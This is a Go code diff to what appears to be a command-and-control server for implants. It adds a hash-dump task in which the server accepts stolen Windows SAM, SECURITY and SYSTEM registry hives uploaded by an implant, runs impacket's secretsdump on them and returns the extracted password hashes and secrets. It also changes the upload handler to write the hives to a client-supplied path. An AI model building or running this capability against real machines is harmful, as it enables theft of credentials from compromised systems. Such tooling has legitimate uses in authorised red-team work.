@@ -366,6 +366,58 @@ func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 		case _task.TASK_DOWNLOAD:
 			downloadPath := taskResult.Result
 			content = fmt.Sprintf("Downloaded at %s", downloadPath)
+		case _task.TASK_HASHDUMP:
+			// Extract uploaded hive paths
+			hives := strings.Split(taskResult.Result, ",")
+			if len(hives) == 0 {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			samHive := hives[0]
+			securityHive := hives[1]
+			systemHive := hives[2]
+			// Check hive files exist.
+			_, err := os.Stat(samHive)
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			_, err = os.Stat(securityHive)
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			_, err = os.Stat(systemHive)
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			// Dump hashes
+			outFile := "/tmp/secretsdump_output"
+			_, err = meta.ExecCommand(
+				"secretsdump.py", // "impacket-secretsdump" if the impacket installed with apt
+				"-sam", samHive,
+				"-security", securityHive,
+				"-system", systemHive,
+				"-outputfile", outFile,
+				"LOCAL",
+			)
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			// Read output
+			resultSam, err := os.ReadFile(outFile + ".sam")
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			resultSecrets, err := os.ReadFile(outFile + ".secrets")
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "")
+				return
+			}
+			content = string(resultSam) + "\n" + string(resultSecrets)
 		case _task.TASK_JITTER:
 			timeStr := taskResult.Task.Args["time"]
 			time, err := strconv.ParseUint(timeStr, 10, 64)
@@ -517,7 +569,6 @@ func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
 			downloadPath := ctx.GetHeader("X-File")
 			// Check if the file already exists
 			if _, err := os.Stat(downloadPath); err == nil {
-				stdout.LogFailed(fmt.Sprintf("Error downloadPath: %s", err))
 				ctx.String(http.StatusBadRequest, "File already exists.")
 				return
 			}
@@ -525,7 +576,14 @@ func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
 			// Save the file
 			err = os.WriteFile(downloadPath, data, 0644)
 			if err != nil {
-				stdout.LogFailed(fmt.Sprintf("Error write file: %s", err))
+				ctx.String(http.StatusBadRequest, "Failed to write file.")
+				return
+			}
+		} else if taskJSON.Command.Code == _task.TASK_HASHDUMP {
+			// Save file
+			hivePath := ctx.GetHeader("X-File")
+			err := os.WriteFile(hivePath, data, 0644)
+			if err != nil {
 				ctx.String(http.StatusBadRequest, "Failed to write file.")
 				return
 			}
